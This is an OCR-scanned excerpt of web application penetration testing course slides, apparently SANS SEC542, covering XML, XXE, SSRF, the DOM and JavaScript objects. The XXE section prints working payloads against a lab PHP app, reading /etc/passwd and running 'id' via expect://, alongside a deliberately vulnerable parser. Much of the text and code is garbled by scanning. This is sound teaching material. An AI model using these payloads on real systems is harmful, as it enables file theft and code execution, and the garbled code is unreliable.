"- ' 
'-" 
Exten!iible Markup Language 
• Extensible Markup Language (XML) is a language originally 
designed for desktop publishing, and now widely used for data 
exchange 
o It is a markup language, similar to HTML 
olt is derived from SGML (Standard Generalized Markup Language), 
which was based on IBM's GML (Generalized Markup Language), which 
dates to the 1960s 
• XML is typically used instead of HTML when data must be sent 
from one application to another (data interchange) 
'-../ 
'-./ 
'---' 
'-' 
-....,· 
'-' 
'-' 
'-.J 
'-' 
'--.,/ 
'-' 
'--.,/ 
'---' 
IBM describes the relationship between SGML, HTML, and XML: 
SGML is popular among organizations that have large amounts of document data to create, manage 
and distribute. SGML has a character set, and allows for entities (objects) to be used. External data 
could be referenced, and extended. SGML prescribes the rules for creating a specific markup language 
such as HTML. HTML is a single set of tags, while SGML provides the capability for creating a desired 
set of tags. 
XML was invented because there are barriers to delivering SGML over the web. These include the lack 
of stylesheet support, no mainstream browser support, software complexity, and obstacles to 
interchange ofSGML data because of varying levels ofSGML compliance among SGML Software 
Packages. Due to the lack of SGML support in mainstream Web browsers, most applications delivering 
SGML information over the Web convert the SGML to HTML. This down-translation removes much of 
the intelligence of the original SGML information, which eliminates flexibility and poses a barrier to 
reuse, interchange and automation. 
XML will displace HTML in Web applications where high degrees of reuse, interchange, and 
automation are required, and will displace HTML as the preferred way to deliver SGML information 
over the web. Full SGML will remain the appropriate technology for creating and storing enterprise- 
critical documents and data. XML will become the primary means to to deliver over the web the vast 
amount of SG ML-based information that currently exists. 1 
'--.,/ 
'-' 
'---' 
'---' 
'-' 
'-../ 
'---' 
'-' 
'---' 
'-../ 
"-.., ' 
'--.,/ 
'-../ 
'--.,/ 
'-'' 
'--.,/ 
'--' 
'-' 
'-' 
Reference: 
[I] 
https://www .ibm.com/support/knowledgecenter/en/S S6RBX _ 11.4.3/com.ibm.sa.xml .design.doc/topics/c _ history 
.html (https://cyber.gd/542 _ 435) 
6 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-../ 
'-' 
'-' 
'---' 
XML Example 
<?xml version="l.0"?> 
<catalog> 
<book> 
<author>Douglas Adams</author> 
<title>The Hitchhiker's Guide to the Galaxy</title> 
<publish_date>1979</publish_date> 
</book> 
<book> 
<author>Douglas Adams</author> 
<title>The Restaurant at the End of the Universe</title> 
<publish_date>1980</publish_date> 
</book> 
</catalog> 
7 
The XML above shows an XML tree. It begins with the XML declaration, which defines the XML version (1.0 
in this case). The root element is catalog, which contains child elements called 'book'. The books contain sub- 
child elements 'author', 'title', and 'publish_ date'. 
Here is the same data, in 'tree view' format: 
1 
I Ocatalog ! 
t'····· 
! 
author : DQtjgJas Adams 
> title : The Hitchhikers Guide to the Galaxy 
publish_date : 1979 
tltio : The Restaurant at !he End of the Universe 
~----=? publish_date : Hl80 
Reference: 
[1] http://www.xmlviewer.org/ (https://cyber.gd/542 _ 436) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
7 
'-' 
'---' 
'----' 
XML External Entity (XXE) 
• OWASP added XXE (XML External Entity) as a new category to 
the OWASP top 10 in 2017 
oAttackers can exploit vulnerable XML processors if they can upload 
XML or include hostile content in an XML document, exploiting 
vulnerable code, dependencies or integrations ... 
oBy default, many older XML processors allow specification of an 
external entity, a URI that is dereferenced and evaluated during 
XML processing ... 
o These flaws can be used to extract data, execute a remote request 
from the server, scan internal systems, perform a denial-of-service 
attack, as well as execute other attacks.1 
'-../ 
-......, 
'-.../ 
.._,, 
'---' 
.__,,. 
, ,, 
.._,, 
-..J 
'-../ 
'-/ 
'----' 
'-../ 
'-' 
OW ASP added XXE based on submissions from software analysis vendors, including Veracode and Synopsis. 
A4:2017-XML External Entities (XXE) is a new category primarily supported by source code analysis 
security testing tools (SAST) data sets.2 
SAST stands for Static Application Security Testing, which analyzes code when it is not running. This includes 
source code analysis. DAST stands for Dynamic Application Security Testing, which analyzes code as it's 
runnmg. 
OW ASP describes the data collection process: 
We received 40+ submissions in the call for data, as many were from the original data call that was 
focused on frequency, we were able to use data from 23 contributors covering ~114,000 applications. 
We used a one year block of time where possible and identified by the contributor. 
References: 
[l] https://www.owasp.org/images/7/72/0WASP _ Top_l0-2017 _%28en%29.pdf.pdf (https://cyber.gd/542 _ l 83) 
[2] Ibid. 
[3] Ibid. 
8 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-----" 
'-' 
'-../ 
'-' 
'------' 
'------' 
'---' 
'------' 
'-../ 
'-../ 
'-' 
'-../ 
'------' 
'------' 
'------' 
'------' 
'------' 
'-' 
'-../ 
'------' 
'-../ 
'-' 
'--./ 
'-.-/ 
Why XML and XXE Matter 
• XXE flaws are a class of injection attacks 
o Injection attacks, like command injection and SQL injection, allow the attacker to hijack 
control of the backend parser/interpreter 
o They are all (broadly) similar, and differ on the syntax of the parser 
• XML supports "external entities" by default 
o External entities vulnerabilities are very similar to Local File Include (LFI) and Remote 
File Include (RFI) vulnerabilities 
• Abuse of XML External Entities (XXE) flaws allow the web application 
penetration tester to turn the XML parser into a proxy, potentially serving 
local and remote content 
o This ranges from retrieving local files, surfing to internal sites (possibly via an Internet- 
facing website) and Remote Code Execution (RCE) 
XXE is a lot like command injection or SQL injection. The difference is the language being used on the 
backend: Instead of bash (for typical command injection on Linux/UNIX servers) or SQL (for SQL injection), in 
this case it is XML. The attack is the same otherwise: A programmer has not performed input sanitization, 
allowing the attacker to execute commands on the web server. In the case of XXE: The attacker sends XML 
commands via user-controlled input, and seeks to gain access to external entities by hijacking the XML parser. 
The OW ASP XXE Prevention Cheat Sheet discusses XXE and external entities: 
XML eXternal Entity injection (XXE) is a type of attack against an application that parses XML input. 
This attack occurs when untrusted XML input containing a reference to an external entity is processed 
by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial 
of service, Server Side Request Forgery (SSRF), port scanning from the perspective of the machine 
where the parser is located, and other system impacts. The following guide provides concise 
information to prevent this vulnerability ... 
General Guidance 
The safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on 
the parser, the method should be similar to the following: 
factory.setFeature("http://apache.org/xml./features/disal.1.ow-doctype- 
decl. ", true); 1 
Reference: 
[ 1] https://www.owasp.org/index.php/XML _External_ Entity _(XXE)_Prevention _ Cheat_ Sheet 
(https://cyber.gd/542 _ 438) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
9 
Server .Sic:le ·Request·· Forgery (SSRF) 
• XXE is a an example of Server-Side Request 
Forgery (SSRF) 
• SSRF is related to CSRF (Cross-Site Request 
Forgery) 
o CSRF: Forged requests originating from a client 
o SSRF: Forged requests originating from a server 
• In the map on the right: The client tricks the 
XML server to initiate requests to the internal 
web server 
o The XML server proxies the client's requests 
In the diagram above: Assume the firewall allows port 80 and 443 to the XML server, but does not allow any 
traffic to the internal web server. The attacker is able to initiate web requests from the XML server to the 
internal web server. The requests initiate from behind the firewall, so they are more likely to be allowed. 
OW ASP describes Server-Side Request Forgery (SSRF): 
Client 
In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to 
read or update internal resources. The attacker can supply or a modify a URL which the code running 
on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able 
to read server corifiguration such as A WS metadata, connect to internal services like http enabled 
databases or perform post requests towards internal services which are not intended to be exposed. 
The target application may have functionality for importing data from a URL, publishing data to a URL 
or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this 
functionality by supplying a completely different URL or by manipulating how URLs are built (path 
traversal etc.). 
1 
Reference: 
[1] https://www.ciwasp.org/index.php/Server_Side_Request_Forgery (https://cyber.gd/542 434) QR 
10 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
\.,_,/ 
\.,_,/ 
'---' 
'--' 
'--' 
'--' 
'--' 
'--' 
..._,, 
..._,, 
'--' 
..._,, 
'---' 
'---' 
'---' 
..._,, 
'--' 
-.._/ 
'----' 
-.._/ 
'----' 
'----' 
'----' 
'---' 
'----' 
'----' 
'---' 
'---' 
'-' 
'--' 
'----' 
'--' 
..._,, 
'--' 
'--' 
'---' 
'---' 
'--' 
..._,, 
'-' 
'--' . 
XMI..Example 
XML Proof of Concept PHP application: 
<?pbp 
$XQ1lfile = file_get_conte11ts('php:f!input'l; 
!com= new DOHOocument(); 
Sdom-" toadXML( $Xlf, H l 1, e' LIBXML_)IOl:NT I LI!lXML - DTDLOAD} ; 
Sxmt 
si1-p lexal import doa{$doa1J; 
sautnor = ,xml->iiuthor; ·-- 
$Utle "" S.<rl.->title; 
id1>te = sxrii.->publish_date; 
Submitted XML file: 
echo "Th,mk you for your book submission! '<br><br>"; 
echo "Yoor entry:<br><br>"; 
echo "Author: 
'' • seuthcr • "<hr>"; 
echo "Title: 
n 
• st it t.e 
~ 
'0<br>1~; 
echo "'Dtrt-e: 
1" 
~ 
'$da:te . 
'l<br>\n".; 
?> 
HTTP Output: 
Thank you for your book submtsstonu 
Your entry: 
Author: Douglas Adams 
Title: The Hitchhiker's Guide to the Galaxy 
Date: 1979 
Note the XML file shown above is available as /home/student/Desktop/XXE/bookl .html. You may send the 
XML to the Proof-of-Concept (PoC) application with curl (command-line browser) using this command: 
$ curl -d@/home/student/Desktop/XXE/bookl.xml http://sec542.org/book.php 
[-l $ curl -d@/home/stm:lent/Desktop/XXE/bookl. xml 
Thank you for your book submission! !<br><br>Your entry:<br><br>Author: 
s Adams<br>Title: The Hitchhiker's Guide to the Galaxy<br>Date: 1979<br> 
£-1$ I 
That displays the raw HTML output. The output shown in the screenshot on the slide above was viewed with 
Firefox. If you would like to do the same, type the following: 
$ curl -d@/home/student/Desktop/XXE/bookl.xml http://sec542.org/book.php > 
/ tmp /bookl . html 
Then open Firefox and surf to: file:// /tmp/bookl. html 
Thanks to Robert Schwass (Twitter: @MRSchwassRobert) for his excellent Black Hills Information Security 
guest article: "XML External Entity - Beyond /etc/passwd (For Fun & Profit)"1 The PoC code shown in this 
section is based on Robert's (and OWASP's) example XXE code. 
Reference: 
[ 1] https://www.blackhillsinfosec.com/xml-extemal-entity-beyond-etcpasswd- fun-profit/ 
(https://cyber.gd/542 _ 437) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
11 
'---' 
'---' 
'---' 
XXE\Example.l -proof ofConcept 
• We updated the XML to define an external entity 
using an XML Data Type Definition (DTD) 
• < ! DOCTYPE foo 
[ 
o Define an XML element called "foo" (the name is 
arbitrary) 
• <!ELEMENT foo ANY > 
o Element "foo" allows any type of content 
•<!ENTITY xxe "It works!!!" >] > 
o Entity "xxe" will display "It works!!!" when called 
• The ENTITY "xxe" will be called when" &xxe" is 
parsed in the XML 
o This will simply display "It works!!" (as a Proof of 
Concept for now, we will expand on this next) 
<?xml version=''l.B"?> 
< !DOCTYPE too [ 
< ! ELEMEtn too ANY > 
<!ENTITY xxe "It works 
! f" >I> 
<entry> 
<author>&xxe; </ author> 
<ti tle>The Hitchhiker' s Guide to 
~he 
</entnt> 
Thank you for your hook submissiontt 
Your entry: 
Author: It works!!! 
Title: The Hitchhiker's Guide to the Galaxy 
Date: 1979 
'-' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---" 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
XML Schema Definition (XSD, newer) or DTDs (legacy) are used to validate XML. DTDs may be used to 
trigger XXE. 
We ran the following command: 
$ curl -d@/home/student/Desktop/XXE/book2.xml http://sec542.org/book.php 
[-1$ curl -d@/home/student/Desktop/XXE/book2,xml http://sec542.org/book.php 
Thank you for your book submission! !<br><br>Your entry :<br><br>Author: It wo 
ks l l !<br>Title; The Hitchhiker' s Guide to the Galaxy<br>Date: 1979<br> 
l 
$ I 
The XML entity "xxe" is clearly being triggered when parsed as "&xxe", displaying the text "It works!!!" 
You may also view the output in Firefox ( as shown on the slide above) by doing the following: 
$ curl -d@/home/student/Desktop/XXE/book2.xml http://sec542.org/book.php > 
/tmp/book2. html 
Then open Firefox and surf to: file:// /tmp/book2. html 
12 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'---' 
'-.J 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-.../ 
'---' 
'---' 
'---' 
'-./ 
'---' 
'---' 
'---' 
'---' 
XXE Example II - Display Local File 
• Next step: Change our ENTITY definition to 
be: 
o <!ENTITY xxe SYSTEM 
"file:///etc/passwd" >]> 
• This will perform a local file include (LFI)- 
style attack and display / etc/passwd 
<?xml version=<'l.0"?> 
<!DOCTYPE foo I 
<!ELEMENT foo ANY> 
..::!ENTITY xxe SYSTEM "file:///etc/passwd" >J> 
<entry> 
<author>&xxe;</author> 
<title>The Hitchhiker•s Guide to the 
Galaxy</title> 
<publish- date>l979</publish.-date> 
</entry> 
Thank you fer ycur book submlsstonl! 
Your entry: 
A\l_tbor; roqt;x_;O:O:root;Jroot:1'bin.-tbi)sb dal!mun;:x; t :l:dacm()_n:/US,r,'sblo:/Psr,'sb\n.tnolo,gin 
bill:X:2:2:bfn:}li&/Usr/Sbtn.took>qln sys:x:3:3:sys:/de\"./us-r{sbinlno!ogtn 
sync:X--4;65534:sync~'bin:/bin{sync g-amesix:5:60:galrte$JU.Sr/yames:;'usr/shln/nologin 
ru.an:x::ti: l 2:man:tvar,'cache/m.an:tusr;sb\nftwlogm lpec 7:7:lp:/var/~poolJlpd:/USr 
/sbitl/nolrn:Jin, ma1l:x:8:8:mai.l:.tvar/:rnaihA1sr/$binfn(Jtogtn ncws:x:9:9:news:Nar/spcol 
/twWSs:/usr/s.bln/i:u.>logln uuq):X;lO: l Ozu:1.1cp:,ivartspoo l/uucp:/lbr/sbi.ll/nol0:-gln 
pmx:ytx113:l3:pmxy:/binu'usrfsbin,1nofo9tn www--data:x:3:.En:www--data,Nar/Www:/usr 
sened-x lOB:11::'i:;,ib{)me/sa.nffliJbintfoh-,e whoop$ie:x: 109:l16;Jn/JMXlS-k:nt:/bhVfnlse 
spt->ech--dispatctier:x:110:29:Spet't'h msp.alche:r,.,:/var{.nm!sp~x.--ch-Oispatcher;/binfsh 
i:l.\ilhi:x, 111:117-:Ava.ld mDNS da.:,-n.1on.,,:Jvar/i'Un/avah.1·<!~etr;dtidlmi/fo.lse 
l1ghtdm,x,J 12'118,Ugltt Display Managor,";ornil>,1igh!<lm,ibin/fa1se 
cokml:x:113:121:roford colour management daemon, .. ;Jv.:is,1ib/colord;lblnlful,;e 
hpltp.x.I 14,7,HPLIP wsrem user,,,if';artrunibpllp;lbln/fulse pulsesc l l5,12H'uls<>Audio 
daemon.,,:/var/runtpuJse,.fbjn/false studermxs 1000: 1000:SW.rlent,,.!/hometstudent 
/bin/bash my-sq_l:x.:l J 6: 125:MySQL Serve:r,,,:tn01'!f<..xtst-fnq"'bin,1alse 
}lQ~, 11 ?J 2fo,/Va1·/spool/µ<,.mx,/!Jin/fofao po,tgros,,,l IS, 128,PQstg,..sQ~ 
admm.l.strat.or,,,:Na:rt'.ilblpQS--~:/bln/bash sshd:..'C;l l9:-tiS5M-:JvartrutVsshd:tusrtshin 
/n!Jlogin btnd.x. ! 20;129::tvar/cache/binddhi111false adent:x: l (}()2; l 002:Art.,ur 
Dent.,Jhome/adcnt:Jbin/hash zheehlebrnx:x:1003:1003:Zaphod Bc..>eblebrox,,,;Jhome 
/zbeebiehro-X:/binfbasl.t fprefot:t;X: t004: 1004:Ford P-rnJert.,,:/hmne/fprc(ect,.:/biu;lb,ash. 
ttl1crnllht1kX;l005:1005:Trtc:ta "'TrHlian"' MGMlU&n,.,~onw!tmcmJHa.n:/b!tVbash. 
bjones:x:1006:1006":HowardJones,,,:lhome[hJones:/binjhash lsmit.h:x:1007:10071Usa 
Jam; SMlth,.,;/home/1.!lniithulnn/ba-Sh uml-net!X:l 21 :130::/houwt 
.. unl-:net;Jb!.nJfftls~ 
Title: The Httchhiker's Guide to tht> Galaxy 
OM~: 19-79 
13 
We ran the following command: 
$ curl -d@/home/student/Desktop/XXE/book3.xml http://sec542.org/book.php 
Here are the results ( output truncated): 
Edit Vi(JflJ 
Terminal. · : Tabs 
~.,,,.,=-,,., 
" 
=-""'= 
[-]$ curl -d@/home/student/Desktop/XXE/book3.xml http://sec542.org/book.php 
Thank you for your book submission!!<br><br>Your entry:<br><br>Author: root:x 
:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/notogin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
You may also view the output in Firefox (as shown on the slide above) by doing the following: 
$ curl -d@/home/student/Desktop/XXE/book3.xml http://sec542.org/book.php > 
/tmp/book3.html 
Then open Firefox and surf to: file:// /tmp/book3. html 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
13 
.___, 
\....; 
\....; 
• Next step: Change our ENTITY definition to be: 
o <!ENTITY xxe SYSTEM "http: //sec542. erg/robots. txt" >] > 
• This will perform a remote file include (RFI)-style attack and display 
http://sec542.org/robots.txt 
o Note that text files are simpler to access than HTML (and other file types) via XXE 
o The encoding in HTML can trigger (blind) XML errors, breaking the XML and resulting in zero 
output to the attacker 
<?xml versfon=''l.0"?> 
< !OOCTYPE +oo [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM "http://sec542.org/ro1:mts.txt" >]> 
<entry> 
<au tho r>&xxe; </author> 
<t it Lec-The Hitchhiker' s Guide to the Galaxy</title> 
<puhl ish._ date>l979</puh Ush_ date> 
Author, User-agent: * Dlsallaw, /Ggi-hin/ Disallow, /admm Disallow, /sensttive 
Title, The mtchhikers Guide to the Galaxy 
Date: 1979 
'-' 
.__,, 
'-' 
.._, 
.._, 
'--' 
'-' 
.._, 
'-' 
'--' 
\...., " 
'---' 
\...., 
.._, 
.._, 
'-' 
We ran the following command: 
.._, 
'-' 
$ curl -d@/home/student/Desktop/XXE/book4.xml http://sec542.org/book.php 
Here are the results, showing robots.txt. Note that this is different than the previous example that displayed 
/etc/passwd: This URL (http://sec542.org/robots.txt) is being downloaded via HTTP, as opposed to being read 
directly from the filesystem: 
' [ - J $ cu r1 - d@/home/ student/Desktop/XXE/book4. xm1 http:.// sec542, o rg/book. php 
!Thank you for your book submission! !<br><br>Your entry:<br><br>Author: User-agent: * 
nisallow: /cgi-bin/ 
iDisa11ow: /admin 
Disallow: /sensitive 
<br>Title: The Hitchhiker's Guide to the Galaxy<br>Oate: 
1.979<br> 
$ I 
You may also view the output in Firefox ( as shown on the slide above) by doing the following: 
$ curl -d@/home/student/Desktop/XXE/book4.xml http://sec542.org/book.php > 
/tmp/book4. html 
Then open Firefox and surf to: file:// /tmp/book4. html 
14 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
.._, 
'-' 
\...., 
'-' 
'--' 
'-- 
\...., 
\....; 
.__,, 
'-' 
.._, 
.._, 
\...., 
'-' 
.._, 
'-../ 
'-../ 
.._, 
.._, 
.._, 
'-' 
XXE Example IV - Remote Code Execution via PHP 
• Next step: Change our ENTI1Y definition to be: 
o<!ENTITY xxe SYSTEM "expect://id" >]> 
• This will execute to shell "id" command 
o Requires the PHP 'expect' module to be enabled on the target web server 
<?xrnl vers..io11::;:"lM8" ?> 
<lOOCTYP!: roe [ 
<!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM "expect://id" >]> 
<entry> 
<a urno r>&xxe; </ au tho 1 > 
<title>Tlle Hitchhiker·s Guide to tile !lalaxy<!title> 
<publist·,_date>l979</pliblish date"' 
</entry> 
Thank you for your hook submtssiont! 
Your entry: 
Author: uid=33(www.data) gid~33(www-<laia) groups~33(www-data) 
Title: Tile Hitchhiker's Guide to the Galaxy 
Date: 1979 
We ran the following command: 
$ curl -d@/home/student/Desktop/XXE/book5.xml http://sec542.org/book.php 
Here are the results, showing the output from the "id" command: 
$ curl -d@/home/student/Desktop/XXE/book5.xml http://sec542.org/book.php 
ank you for your book submission!!<br><br>Your entry:<br><br>Author: uid"'33(www-dat 
a) gid=33(\vW\>Hiata) groups=33(www-data) 
,<br>Title: The Hitchhiker's Guide to the Galaxy<br>Date: 1979<br> 
£-1$ I 
You may also view the output in Firefox ( as shown on the slide above) by doing the following: 
$ curl -d@/home/student/Desktop/XXE/book5.xml http://sec542.org/book.php > 
/tmp/book5.html 
Then open Firefox and surf to: file:// /tmp/book5. html 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
15 
.,.___,, 
'---' 
XXE:. Flying Blind 
• XXE is often triggered via PHP, resulting in a server-side request 
o This request will not be shown in an interception proxy such as Burp 
Suite or ZAP, since it goes from server-> server 
• One challenge: The attacker cannot (usually) view the source of 
PHP, so the attack is often partially blind 
o This code is normally served from and interpreted by the web server, 
and is not sent to the browser 
• Common XXE challenge: Discovering or inferring that XML 
content and/ or code exists, without any direct evidence 
oTests of open source software (or crystal-box tests where the client 
supplies the source code) are easier than black-box tests for this reason 
'---' 
'---' 
'---' 
'----' 
..._,, 
'---' 
'-./ 
-.....,, 
'-../ 
'-../ 
"-..,, · 
'-../ 
'----' 
XXE is much easier to test when the penetration tester has access to the backend code, as well as the XML 
format itself. Beginning penetration testers often view this as a larger problem than it actually is: It is clearly not 
an issue for open source code. Also: Crystal-box ( aka full-knowledge) penetration tests versus vulnerabilities 
such as XXE are quite common. In this case: The tester is granted access to the code, XML design, etc. 
If a client does want a black-box (aka zero-knowledge) test for XXE (where no inside information is provided), 
the course authors usually attempt to convince the client to switch to crystal box. If they stick to their guns, the 
penetration tester's job is to discover web applications that use XML (PHP is common), and then infer the XML 
design itself. The latter is often not terribly difficult. 
The application used XML attributes "book", "author", and "publish_date". ln this case: guessing "author" and 
"book" is trivial based on the application output ("publish_ date" would have been harder, since the app output 
listed it as "date"). More good news: We only need to guess one attribute (we used author) for the attack to 
work. We will demonstrate this in the lab coming up next. 
16 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'-../ 
'-/ 
..._,, 
'-../ 
'---' 
'-../ 
'-./ 
'-../ 
'----' 
'---' 
'-../ 
'---' 
'-../ 
"-..,, 
'-../ 
'-/ 
'---' 
'-../ 
'---' 
'-../ 
'-../ 
'-./ 
'-../ 
'-./ 
\._.., 
Blind XXE Example 
• In this example: entry.html 
POSTs to entry.php, which 
then POSTs to xml.php 
• The POST from entry.php to 
xml.php is sent server->server, 
so the client cannot see it or 
intercept it 
• We will explore this 
application in the next lab 
In the example above, the client can see the HTML source code for http://sec542.org/guide/entry.htrn1, shown 
here: 
, <htal1> 
<body backgrnund,.' /images/huhbleJ!l!l"> 
<lll>The Hitcllhiker's Guide to the GalaXXE</ffl> 
welcome to the The Hitchhiker•, Guide to the 6alaxxE: we were Wikipedia a billion years before WikipediaHhrxbr> 
This is our- nw article creation form: please help expand the universe's knowledge by cr~ating an article,,<hr><br> 
dorm meth«!,•posr actio1Fentry .pho> 
Subject: <br> 
<input type • •text" • ...., - "rnbject"s<br><br> 
Cat09ory: <Or> 
<input type a ·text· ..... - ·category"><br><br> 
Text: <br> 
<input type • "text• """" = ·text"><brxbr> 
<input type•"submit~ name,.,."s:ubmit" vatoo--submit"> 
-</form> 
</body> 
</html> 
It references http://sec542.org/guide/entry.php. Viewing source for that page shows the HTML only, and not the 
PHP code: 
<htmb<body background=" timages/hubble. j pg"><Ml>Thank you! ! </Hl>Thank you for your 
Hitchhiker' s Guide to the GalaXXE Submission!! <br><br>Your entry: <brxbr>Subject: 
Earth<br>Category: Planets<br>Text: Mostly harmless.<br> 
<br><br><a href="entry,html ">Click here</a> to make another entry</bodp</htmb 
The PHP code itself accesses xrnl.php, which cannot be seen by the client. You may view the source locally by 
typing: 
$ cat /var/www/html/guide/entry.php 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
17 
'---' 
'---' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXE andXSS 
I.XXE 
2. Exercise: XXE 
3. Document Object Model (DOM) 
4. Cross-Site Scripting 
5. Classes ofXSS 
6. Exerdse: XSS 
7. Discovering XSS 
$. XSS Impacts 
9. Exercise: HTML 
10.XSS 
I I. BeEF 
12. Exercise: BeEF 
13.AJAX 
14. API A:ttadts 
IS. Data At1:ac1ts 
I 6. Exercise: AJAX XSS 
17. Summary 
Primer 
SEC542 I Web App Penetration Testing and Et~icaJ Hacking 
'-J 
'-J 
'-' 
'-..,, 
'-.../ 
'-..,, 
'-' 
'-.../ 
'-.../ 
'-..,, 
'-.../ 
'-' 
'-' 
'-..,, ' 
'-J 
Course Roadmap 
....,, 
'---' 
Our next exercise is on XXE. 
'-.../ 
'---' 
'-J 
'-J 
'-J 
'-' 
'-J 
'-J 
'-' 
'---' 
'-' 
'-.../ 
'---' 
''-J 
'---' 
'-" 
'-J 
'-../ 
'---' 
18 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
·.._; 
'-J 
Sl:CS42 Workbook: XXI: 
II 
Exercise 4.1: XXE 
SEC542lWeb App J>enetrationTesting and Ethical Hacking 
SEC542 Workbook: XXE 
Please go to Exercise 4.1 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
19 
"--" 
"--" 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
!.XXE 
2. Exercise: XXE 
3. Document Object Model (DOM) 
4. Cross-Site Scripting (XSS) Primer 
5. Classes of XSS 
6. Exercise: XSS 
7. Discovering XSS 
ft XSS Impacts 
9. Exercise: HTML 
10. XSS Tools 
I l. BeEF 
11. Exercise: BeEf 
13.AJAX 
14. API Attacks 
15. Data Attacks 
Exercise: AJAX 
11. Summary 
SECS42 !Web 
Hacking 
20 
'-' 
'-' 
'-' 
'-' 
'-' 
'-.J 
'-' 
'-../ 
'-' 
'-../ 
'-../ 
'-../ 
'-../ 
'-' 
'-../ 
'-../ 
'-../ 
Course Roadmap 
'-' 
"--" 
The next section describes the Document Object Model (DOM). 
.'-' 
'-' 
'-../ 
'-../ 
'-../ 
'-' 
'-.J 
'-../ 
'-../ 
'-' 
'-' 
'-../ 
'-' 
'-" 
'-../ 
'-../ 
'-' 
'-' 
'-../ 
20 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
,,------.. _ 
Document Object Model (DOM) 
The DOM provides a standard interface to the document allowing scripts to 
dynamically access and update content, structure, or style of the page 
• The document referenced is either the HTML or XML page currently being used 
The DOM also provides native objects to access various items of interest 
• Document object refers to the whole document 
o document. forms [0] refers to the first form on the page 
o document.write ( "Hello World!") writes the string Hello World! to the page 
o document. write (document. cookie) will write the value of the page's cookies to the page 
• Form object is used to access a specific form 
o form. action = [URL] sets the form's action to the URL allowing for redirecting the browser to 
another page 
o form. submit () will submit the form 
We will explore many others in the exercise challenges ahead 
The Document Object Model (DOM) is a standard interface provided by JavaScript that allows for dynamic 
access to the pieces of the current page and browser window. The DOM provides objects such as the Form and 
Windows objects. These allow for access and control of the various parts of what they represent. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
21 
'--' 
DOM Nodes 
• The document is viewed as a tree 
• The HTML tag is the root and has two children: HEAD and BODY 
• Each item is a child from there 
'--' 
'-._.,; 
'--' 
'-._.,; 
'-....-· 
'-' 
The document and its window are viewed and managed as a tree. As we can see from the diagram above, the 
tree starts with the HTML tag and then branches from there. Each node from there is a child of the one above it 
and a parent to any below it. Each tag may have one or more attributes assigned to it, such as color or size. 
22 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-._.,; 
'--' 
'-._.,; 
'--' 
'-._.,; 
'--' 
'-" 
'-' 
'-._.,; 
'-._.., 
'-' 
'-../ 
'--- 
'-._.., 
'-._.,; 
'--' 
'-../ 
'-../ 
'---' 
'-../ 
'-._.,; 
'-' 
'---' 
'-._.,; 
'-._.,; 
'-' 
'--' 
'-' 
'--' 
'-._.,; 
'-.J 
'--' 
. .__,. 
JavaScript Object Methods and Properties 
• JavaScript is an object-oriented 
programming language 
• Objects have to be initialized 
o var myString = new String () ; 
• Objects have properties and 
methods 
o Properties are attributes of the object 
o Methods are actions performed on the 
object 
• Developers can create their own 
objects 
• We will focus on the built-in objects 
here with some examples of 
properties and methods that are 
useful for penetration testers 
• When referring to a property of an 
object, we use the format 
object.property 
o document. referrer 
• Calling a method is similar, but also 
includes () with values determined 
by the method 
o window. alert ("This pop-up 
shows a method, alert()"); 
Because JavaScript is an object-oriented programming language, it provides a series of objects, and developers 
can create their own. Objects are a method to provide copies of an item in memory that can be referenced and 
used separately. 
Objects must be initialized instead of just being assigned to a variable. These objects can provide properties, 
which are attributes of the object, and methods, which are actions. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
23 
\._,I 
ObjectsandTheirAssociated .·Properties and/Methods 
Object type: String 
• Property: length returns the size 
• Method: split () parses the string 
• Example: string. length = 42 
Object type: Date 
• Method: getTime () returns the current time 
• Method: getMonth () returns the current month 
Object type: Array 
• Method: join () joins the elements in the array 
• Method: sort () sorts the array 
• Example: array. sort () ; 
Object type: Window 
• Method: open,() creates a new browser window 
• Method: alert () pops up a dialog box 
• Example:window.alert("Hi World"); 
Object type: Document 
• Method: write () writes content to the page 
• Method: referrer () returns the referring URL 
• Example: document.write ("Hello"); 
Object type: Location 
• Method: reload () reloads the document 
• Property: port returns the port of the current page 
• Example: location.port= 80; 
Object type: History 
• Method: back () is the same as the back button 
